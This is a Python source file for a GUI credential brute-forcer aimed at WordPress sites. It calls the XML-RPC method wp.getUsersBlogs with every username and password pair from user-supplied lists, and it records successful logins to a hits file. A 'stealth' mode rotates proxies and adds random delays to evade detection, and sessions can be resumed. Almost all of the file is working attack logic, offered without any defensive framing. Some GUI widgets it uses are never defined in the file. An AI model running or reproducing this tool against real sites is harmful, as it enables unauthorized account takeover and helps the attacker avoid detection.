import os
import json
import time
import random
import threading
import xmlrpc.client
import itertools
import logging
from urllib.parse import urlparse

# GUI-related imports
import customtkinter as ctk
from tkinter import filedialog, messagebox
import tkinter as tk
from datetime import datetime

# === Constants ===
LOG_FILE_PATH = "xvector_log.txt"
SESSION_FILE = "session.json"
HITS_FILE = "hits.txt"
ABORT_FLAG = threading.Event()

# Globals
start_time = None
attempt_counter = 0

# === Logging Setup ===
logging.basicConfig(filename=LOG_FILE_PATH, level=logging.INFO,
                    format='%(asctime)s [%(levelname)s]: %(message)s')


def log_message(message, level="info"):
    """Log messages with different severity levels."""
    levels = {
        "info": logging.info,
        "success": logging.info,  # Map to info for simplicity
        "error": logging.error,
        "warning": logging.warning
    }
    levels.get(level, logging.info)(message)


# === Helper Functions ===
def browse_file(entry_widget, file_types, label):
    """Open a file dialog and set the selected file path to the entry widget."""
    path = filedialog.askopenfilename(title=f"Select {label}", filetypes=file_types)
    if path:
        entry_widget.delete(0, "end")
        entry_widget.insert(0, path)


def validate_target_url(target):
    """Validate the target URL format."""
    parsed = urlparse(target)
    if not parsed.scheme or not parsed.netloc:
        messagebox.showerror("Input Error", "Invalid URL format. Use http(s)://example.com")
        return False
    return True


def validate_inputs(target, usernames, wordlist_path, min_delay, max_delay):
    """Validate user inputs and return True if all inputs are valid."""
    if not target or not usernames or not wordlist_path:
        messagebox.showerror("Input Error", "Please fill in all required fields.")
        return False
    if not target.startswith("http") or not validate_target_url(target):
        return False
    if not os.path.isfile(wordlist_path):
        messagebox.showerror("File Error", "Password wordlist file not found.")
        return False
    try:
        min_delay = float(min_delay)
        max_delay = float(max_delay)
        if min_delay < 0 or max_delay < 0 or min_delay > max_delay:
            raise ValueError()
    except ValueError:
        messagebox.showerror("Input Error", "Invalid delay values.")
        return False
    return True


def prepare_wordlist(wordlist_path):
    """Load and prepare the wordlist from the given file path."""
    try:
        with open(wordlist_path, 'r', encoding="utf-8") as file:
            return [line.strip() for line in file if line.strip()]
    except Exception as e:
        raise ValueError(f"Error loading wordlist: {e}")


def run_brute_force():
    """Run the brute force attack process."""
    global attempt_counter, start_time
    ABORT_FLAG.clear()
    attempt_counter = 0
    start_time = time.time()

    # Collect user inputs
    target = target_entry.get().strip()
    usernames = [u.strip() for u in usernames_box.get("1.0", "end").strip().splitlines() if u.strip()]
    wordlist_path = wordlist_entry.get().strip()
    proxylist_path = proxy_entry.get().strip()
    stealth_mode = stealth_var.get()
    min_delay = min_delay_entry.get()
    max_delay = max_delay_entry.get()

    # Validate inputs
    if not validate_inputs(target, usernames, wordlist_path, min_delay, max_delay):
        return

    min_delay = float(min_delay)
    max_delay = float(max_delay)

    # Prepare the wordlist
    try:
        passwords = prepare_wordlist(wordlist_path)
    except ValueError as e:
        messagebox.showerror("File Error", str(e))
        return

    # Prepare proxies if needed
    proxies = []
    proxy_cycle = None
    if stealth_mode and proxylist_path and os.path.isfile(proxylist_path):
        try:
            with open(proxylist_path, 'r', encoding="utf-8") as pf:
                proxies = [p.strip() for p in pf if p.strip()]
            if proxies:
                proxy_cycle = itertools.cycle(proxies)
        except Exception as e:
            log_message(f"[!] Proxy list error: {e}", "error")

    # Resume session if available
    resume_index = 0
    if os.path.exists(SESSION_FILE):
        if messagebox.askyesno("Resume Session?", "Previous session found. Resume?"):
            try:
                with open(SESSION_FILE, "r", encoding="utf-8") as sf:
                    session_data = json.load(sf)
                    resume_index = session_data.get("resume_index", 0)
                    log_message(f"[*] Resuming session at attempt #{resume_index}", "info")
            except Exception as e:
                log_message(f"[!] Could not resume session: {e}", "error")

    # Connect to the target server
    try:
        server = xmlrpc.client.ServerProxy(target)
    except Exception as e:
        log_message(f"[!] Could not connect to target: {e}", "error")
        return

    # Brute force logic
    hit_found = False
    total_attempts = len(usernames) * len(passwords)

    for idx, user in enumerate(usernames):
        if ABORT_FLAG.is_set():
            break
        log_message(f"[*] Trying user: {user}", "info")

        for pwd_idx, password in enumerate(passwords):
            if ABORT_FLAG.is_set():
                log_message("[!] Attack aborted!", "warning")
                return

            current_attempt = idx * len(passwords) + pwd_idx
            if current_attempt < resume_index:
                continue  # Skip already tried

            try:
                resp = server.wp.getUsersBlogs(user, password)
                attempt_counter += 1
                if resp:
                    hit = f"[+] SUCCESS: {user}:{password}"
                    log_message(hit, "success")
                    with open(HITS_FILE, "a", encoding="utf-8") as hf:
                        hf.write(hit + "\n")
                    hit_found = True
                    break
            except xmlrpc.client.Fault:
                attempt_counter += 1
                pass
            except Exception as e:
                log_message(f"[!] Error on {user}:{password} -> {e}", "error")
                break

            # Save progress
            try:
                with open(SESSION_FILE, "w", encoding="utf-8") as sf:
                    json.dump({"resume_index": current_attempt}, sf)
            except Exception as e:
                log_message(f"[!] Session save error: {e}", "error")

            # Random delay if stealth
            if stealth_mode:
                delay = random.uniform(min_delay, max_delay)
                log_message(f"[*] Sleeping {delay:.2f}s", "info")
                time.sleep(delay)

        if hit_found:
            break

    # Clean up session if completed
    try:
        if os.path.exists(SESSION_FILE):
            os.remove(SESSION_FILE)
    except Exception:
        pass

    if hit_found:
        messagebox.showinfo("Done", "Brute-force completed! Credentials found.")
    else:
        messagebox.showinfo("Done", "Brute-force completed. No valid credentials found.")
    log_message("[*] Brute-force completed.", "success")
